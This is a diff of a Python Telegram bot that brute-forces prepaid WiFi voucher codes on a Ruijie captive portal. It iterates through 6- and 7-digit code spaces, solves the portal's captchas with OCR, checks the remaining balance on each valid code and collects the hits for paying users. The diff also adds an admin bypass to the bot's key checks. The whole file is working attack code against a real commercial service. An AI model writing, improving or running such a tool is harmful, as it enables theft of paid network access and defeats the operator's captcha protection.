@@ -47,21 +47,18 @@ if not ADMIN_ID.lstrip("-").isdigit():
 SUCCESS_CODE = asyncio.Queue()
 bot = AsyncTeleBot(BOT_TOKEN)
 
-user_data = {}              # {chat_id: {"session_url": ...}}
-approve = {}                # {chat_id: True/False}
-scan_tasks = {}             # {chat_id: {"task": asyncio.Task, "stop": bool, "scan_id": str}}
-# success_texts now stores dict: {chat_id: [{"code": ..., "session_id": ..., "plan": ...}, ...]}
+user_data = {}
+approve = {}
+scan_tasks = {}
 success_texts = {}
-old_success_texts = {}      # {chat_id: [...]} – previous session codes (before last /setup)
-limited_texts = {}          # {chat_id: [code, ...]}
-old_limited_texts = {}      # {chat_id: [code, ...]} – previous session limited codes
-captcha_state = {}          # captcha cache per chat_id
+old_success_texts = {}
+limited_texts = {}
+old_limited_texts = {}
+captcha_state = {}
 
-# New additions
-notify_setting = {}         # {chat_id: True/False} – notification toggle
-last_scan_params = {}       # {chat_id: {"mode": str, "target": int|None}}
-pending_brute = {}          # {chat_id: {"mode": str, "target": int|None}}
-# notify message tracking: {chat_id: {"msg_id": int, "text": str}}
+notify_setting = {}
+last_scan_params = {}
+pending_brute = {}
 notify_state = {}
 
 session = None
@@ -69,7 +66,6 @@ _connector = None
 
 # ── Helper: send long text in ≤4096-char chunks split at newlines ──────────
 async def send_chunks(chat_id, text, parse_mode="Markdown", reply_to_message_id=None):
-    """Split text at newlines into Telegram-safe chunks and send each one."""
     MAX = 4096
     if len(text) <= MAX:
         await bot.send_message(chat_id, text, parse_mode=parse_mode,
@@ -146,7 +142,6 @@ PLAN_RE = re.compile(r"^(\d+(?:mo|min|h|d|m))+$|^unlimit(?:ed)?$", re.IGNORECASE
 
 
 def _parse_duration_seconds(value):
-    """Return seconds, infinity for unlimited, or None for an invalid duration."""
     if not isinstance(value, str):
         return None
     normalized = re.sub(r"\s+", "", value.strip().lower())
@@ -174,7 +169,6 @@ def _parse_duration_seconds(value):
 
 
 def check_key_expiration(expiration_time):
-    """Accept dict, ISO-8601, unlimited sentinel, and legacy expiry strings."""
     try:
         if isinstance(expiration_time, dict):
             expiration_time = expiration_time.get("expires_at")
@@ -190,7 +184,6 @@ def check_key_expiration(expiration_time):
                 expiration_dt = expiration_dt.replace(tzinfo=timezone.utc)
             return datetime.now(timezone.utc) < expiration_dt
         except ValueError:
-            # Legacy format: mm-hh-dd-MM-yyyy.
             mm, hh, dd, month, year = map(int, raw.split("-"))
             expiration_dt = datetime(
                 year=year,
@@ -207,8 +200,14 @@ def check_key_expiration(expiration_time):
         return False
 
 
+# ── NEW: Admin bypass function ─────────────────────────────────────────────
+def is_approved(chat_id):
+    if str(chat_id) == ADMIN_ID:
+        return True
+    return approve.get(chat_id, False)
+
+
 def generate_expiry(plan):
-    """Return an ISO-8601 expiry for 30min, 1h30m, 1d, 1mo, or unlimited."""
     duration_seconds = _parse_duration_seconds(plan)
     if duration_seconds is None or duration_seconds <= 0:
         return None
@@ -218,7 +217,6 @@ def generate_expiry(plan):
 
 
 def plan_to_minutes(value):
-    """Convert a duration to minutes using the same parser as key generation."""
     duration_seconds = _parse_duration_seconds(value)
     if duration_seconds is None:
         return 0
@@ -230,8 +228,6 @@ def iter_codes(mode):
     if mode in {"6", "7"}:
         length = int(mode)
         total = 10 ** length
-        # A coprime step visits every value exactly once without creating a
-        # list of millions of strings in memory.
         current = random.randrange(total)
         step = random.randrange(1, total)
         while math.gcd(step, total) != 1:
@@ -263,7 +259,7 @@ def format_progress(checked, total=None, speed=0, found=0, target=None):
         lines.append(f"🎯 Target: {found}/{target}")
     return "\n".join(lines)
 
-# ── Captcha handling (per voucher) ─────────────────────────────────────────
+# ── Captcha handling ─────────────────────────────────────────────────────────
 _ocr = ddddocr.DdddOcr(show_ad=False)
 
 def _ocr_sync(image_bytes):
@@ -365,9 +361,8 @@ async def check_session_url(session_url):
     except:
         return False
 
-# ── Balance checker (new) ──────────────────────────────────────────────────
+# ── Balance checker ──────────────────────────────────────────────────
 def _parse_seconds(val):
-    """Convert a numeric value to human-readable time string (treats value as seconds)."""
     secs = int(val)
     hours = secs // 3600
     mins = (secs % 3600) // 60
@@ -379,7 +374,6 @@ def _parse_seconds(val):
         return f"{secs}s"
 
 def _parse_minutes(val):
-    """Convert a numeric value to human-readable time string (minutes → m/h/d/mo)."""
     total_mins = int(val)
     if total_mins <= 0:
         return "0m"
@@ -398,7 +392,6 @@ def _parse_minutes(val):
     return f"{months}mo {rem_days}d" if rem_days else f"{months}mo"
 
 async def get_balance(session_id):
-    """Fetch remaining time for a given session_id. Returns string like '2h 30m' or 'N/A'."""
     url = f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}"
     headers = {
         'authority': 'portal-as.ruijienetworks.com',
@@ -427,7 +420,6 @@ async def get_balance(session_id):
             except Exception:
                 return "N/A"
 
-            # Flatten: check top-level, nested 'result' and 'data' dicts
             candidates = [data]
             for nested_key in ['result', 'data']:
                 if isinstance(data, dict) and isinstance(data.get(nested_key), dict):
@@ -436,12 +428,10 @@ async def get_balance(session_id):
             for d in candidates:
                 if not isinstance(d, dict):
                     continue
-                # Minutes-based keys — totalMinutes first (plan total), then remaining
                 for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 'leftMinutes', 'balance', 'remaining']:
                     val = d.get(key)
                     if val is not None:
                         return _parse_minutes(val)
-                # Seconds-based keys
                 for key in ['remainingSeconds', 'remainTime', 'remainingTime', 'leftTime', 'timeLeft', 'remain_time']:
                     val = d.get(key)
                     if val is not None:
@@ -452,7 +442,7 @@ async def get_balance(session_id):
         print(f"[get_balance] error for {session_id}: {e}")
         return "N/A"
 
-# ── Core voucher check (used inside brute) ─────────────────────────────
+# ── Core voucher check ─────────────────────────────────────────────
 async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None, plan_filters=None):
     if not recheck:
         current_task = scan_tasks.get(chat_id)
@@ -464,7 +454,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
     ).decode()
 
     response = None
-    session_id = None   # capture session_id for success logging
+    session_id = None
     for attempt in range(3):
         timeout = aiohttp.ClientTimeout(total=30)
         async with aiohttp.ClientSession(
@@ -477,7 +467,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
             if not session_id:
                 continue
 
-            # Solve captcha
             auth_code = None
             for _ in range(8):
                 try:
@@ -537,9 +526,8 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
 
     if 'logonUrl' in response:
         if recheck:
-            return code  # recheck just returns code if still valid
+            return code
 
-        # Fetch plan duration immediately while session is fresh
         plan_str = "N/A"
         try:
             fetched = await get_balance(session_id)
@@ -548,20 +536,17 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
         except Exception:
             pass
 
-        # Apply plan filter if specified (OR logic: code must satisfy at least one filter)
         if plan_filters:
             code_mins = plan_to_minutes(plan_str)
             if not any(code_mins >= plan_to_minutes(f) for f in plan_filters):
-                return None  # doesn't match any plan filter, skip silently
+                return None
 
-        # Store success with session_id + cached plan duration
         if chat_id not in success_texts:
             success_texts[chat_id] = []
         success_texts[chat_id].append({"code": code, "session_id": session_id, "plan": plan_str})
 
         await SUCCESS_CODE.put({"chat_id": chat_id, "code": code, "session_id": session_id, "plan": plan_str})
 
-        # Notification if enabled — paginated: edit last page or start a new page when full
         if notify_setting.get(chat_id, False) and message:
             try:
                 items = success_texts[chat_id]
@@ -592,7 +577,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                             pages[-1] = {"msg_id": sent.message_id, "first_idx": first_idx}
                             notify_state[chat_id] = pages
                     else:
-                        # Overflow: open a new page starting with this code
                         new_page_text = f"✅ Success Codes (cont. {n}):\n`{code}` – ⏳ {plan_str}"
                         sent = await bot.send_message(chat_id, new_page_text, parse_mode="Markdown")
                         pages.append({"msg_id": sent.message_id, "first_idx": n - 1})
@@ -679,7 +663,8 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, target=None, messa
             if not batch:
                 break
 
-            if time.monotonic() - last_key_check >= 600:
+            # ── Admin bypass for key check ──
+            if str(chat_id) != ADMIN_ID and time.monotonic() - last_key_check >= 600:
                 auth_list, _ = await get_file_content("auth_list.json")
                 if (
                     str(chat_id) not in auth_list
@@ -701,7 +686,7 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, target=None, messa
             results = await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
 
             for res in results:
-                if res:  # success code returned
+                if res:
                     found += 1
                     if target and found >= target:
                         await progress_msg.edit_text("🎯 Target reached!")
@@ -738,8 +723,6 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, target=None, messa
         last_scan_params.pop(chat_id, None)
         save_state()
     except asyncio.CancelledError:
-        # `/stop` persists the parameters before cancellation. This fallback
-        # also protects callers that cancel a task directly.
         current = scan_tasks.get(chat_id)
         if current and current.get("scan_id") == scan_id:
             _remember_scan(chat_id, mode, target, plan_filters)
@@ -764,7 +747,6 @@ async def github_update_scheduler():
                     sid = item.get("session_id", "")
                     if chat_id not in results:
                         results[chat_id] = []
-                    # Check if code already exists (support both old string format and new dict format)
                     existing_codes = [
                         e["code"] if isinstance(e, dict) else e
                         for e in results[chat_id]
@@ -778,7 +760,6 @@ async def github_update_scheduler():
 STATE_FILE = "state.json"
 
 def save_state():
-    """Persist user_data, approve, notify_setting, last_scan_params to disk."""
     try:
         payload = {
             "user_data": {str(k): v for k, v in user_data.items()},
@@ -792,7 +773,6 @@ def save_state():
         print(f"[save_state] error: {e}")
 
 def load_state():
-    """Load persisted state from disk into global dicts."""
     if not os.path.exists(STATE_FILE):
         return
     try:
@@ -810,9 +790,7 @@ def load_state():
     except Exception as e:
         print(f"[load_state] error: {e}")
 
-# ── Load saved results from GitHub on startup ──────────────────────────────
 async def load_saved_results():
-    """Load result.json from GitHub into success_texts on startup."""
     try:
         results, _ = await get_file_content("result.json")
         for chat_id_str, entries in results.items():
@@ -831,7 +809,6 @@ async def load_saved_results():
                     code = str(entry)
                     sid = ""
                     plan = "N/A"
-                # Avoid duplicates
                 if not any(e["code"] == code for e in success_texts[cid]):
                     success_texts[cid].append({"code": code, "session_id": sid, "plan": plan})
         total = sum(len(v) for v in success_texts.values())
@@ -871,7 +848,16 @@ async def help_cmd(message):
 
 @bot.message_handler(commands=['key'])
 async def handle_key(message):
-    key = str(message.chat.id)
+    chat_id = message.chat.id
+    
+    if str(chat_id) == ADMIN_ID:
+        approve[chat_id] = True
+        user_data.setdefault(chat_id, {})
+        save_state()
+        await bot.reply_to(message, "✅ Admin အနေဖြင့် အတည်ပြုပြီးပါပြီ။ /setup ဖြင့် Session URL ထည့်ပါ။")
+        return
+    
+    key = str(chat_id)
     auth_list, _ = await get_file_content("auth_list.json")
     if key in auth_list:
         if check_key_expiration(auth_list[key]):
@@ -893,7 +879,8 @@ async def handle_setup(message):
         await bot.reply_to(message, "အသုံးပြုနည်း:\n/setup your_session_url")
         return
     url = args[1]
-    if not approve.get(message.chat.id, False):
+    
+    if not is_approved(message.chat.id):
         await bot.reply_to(message, "/key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
         return
     await bot.reply_to(message, "Session URL စစ်ဆေးနေပါသည်...")
@@ -919,7 +906,6 @@ async def handle_setup(message):
         limited_messages.pop(cid, None)
         notify_state.pop(cid, None)
 
-        # Clear this user's codes from GitHub result.json
         try:
             results, sha = await get_file_content("result.json")
             if str(cid) in results:
@@ -954,7 +940,6 @@ async def brute(message):
     plan_filters = []
 
     idx = 2
-    # Check if next arg is a target (integer, not a plan string)
     if idx < len(args) and not PLAN_RE.match(args[idx]):
         try:
             target = int(args[idx])
@@ -963,7 +948,6 @@ async def brute(message):
             await bot.reply_to(message, "Target သည် ဂဏန်းဖြစ်ရပါမည်။\nPlan ဥပမာ: 30min, 2h, 1d, 1mo, unlimit")
             return
 
-    # Remaining args are plan filters (can be multiple)
     for arg in args[idx:]:
         if PLAN_RE.match(arg):
             plan_filters.append(arg)
@@ -972,7 +956,8 @@ async def brute(message):
             return
 
     chat_id = message.chat.id
-    if not approve.get(chat_id, False):
+    
+    if not is_approved(chat_id):
         await bot.reply_to(message, "/key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
         return
     if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
@@ -1021,8 +1006,6 @@ async def stop_scan(message):
     chat_id = message.chat.id
     data = scan_tasks.get(chat_id)
     if data and not data["task"].done():
-        # Persist before cancelling: cancellation can prevent the scan loop
-        # from reaching its normal stop branch.
         _remember_scan(
             chat_id,
             data["mode"],
@@ -1057,7 +1040,7 @@ async def handle_resume_callback(call):
         params = last_scan_params.pop(chat_id)
         await bot.edit_message_text("ယခင် scan ပြန်စပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
         await start_brute_scan(chat_id, params['mode'], params['target'], call.message, plan_filters=params.get('plan_filters', []))
-    else:  # new_scan
+    else:
         if chat_id in pending_brute:
             params = pending_brute.pop(chat_id)
             last_scan_params.pop(chat_id, None)
@@ -1075,7 +1058,6 @@ async def saved_codes(message):
         await bot.reply_to(message, "ရှာတွေ့ထားသော code မရှိသေးပါ။")
         return
 
-    # Build lines — use cached plan (no live API call needed)
     parts = []
     if success:
         parts.append(f"✅ **Success Codes** ({len(success)})")
@@ -1104,7 +1086,8 @@ async def toggle_notify(message):
 @bot.message_handler(commands=['recheck'])
 async def recheck(message):
     chat_id = message.chat.id
-    if not approve.get(chat_id, False):
+    
+    if not is_approved(chat_id):
         await bot.reply_to(message, "/key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
         return
     if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
@@ -1123,10 +1106,9 @@ async def recheck(message):
             recheck=True, message=message
         )
         if recode:
-            new_success.append(item)   # keep same session_id for balance
+            new_success.append(item)
     if new_success:
         success_texts[chat_id] = new_success
-        # Optionally show codes after recheck (no balance fetch here to keep it fast)
         await bot.reply_to(message, "✅ Rechecked Codes:\n" + "\n".join(i["code"] for i in new_success))
     else:
         success_texts[chat_id] = []
@@ -1158,7 +1140,6 @@ async def testbalance(message):
         return
     chat_id = message.chat.id
 
-    # Collect test targets: stored success codes for this chat, or all chats
     targets = []
     for cid, items in success_texts.items():
         for item in items:
@@ -1170,7 +1151,7 @@ async def testbalance(message):
 
     await bot.reply_to(message, f"🔍 Testing balance for {len(targets)} code(s)...")
 
-    for t in targets[:3]:  # max 3 codes to avoid spam
+    for t in targets[:3]:
         sid = t["session_id"]
         code = t["code"]
         url = f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{sid}"
